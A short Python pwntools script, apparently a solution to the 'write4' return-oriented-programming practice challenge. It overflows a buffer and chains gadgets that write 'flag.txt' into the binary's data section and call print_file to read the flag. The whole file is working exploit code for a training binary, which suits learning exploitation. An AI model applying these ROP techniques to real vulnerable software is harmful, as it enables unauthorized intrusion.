from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


exe = './write4'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'

data_section = 0x601028
mov_Pr14_r15 = 0x0000000000400628
pop_r14_r15 = 0x400690
pop_rdi_ret = 0x400693
print_file = 0x400510

io = start()

payload = flat({
    40: [
    	pop_r14_r15,
    	data_section,
    	'flag.txt',
    	mov_Pr14_r15,

    	pop_rdi_ret,
    	data_section,
    	print_file
    ]
})
write('payload', payload)

io.sendlineafter('>', payload)

io.recvline()
flag = io.recv()
success(flag)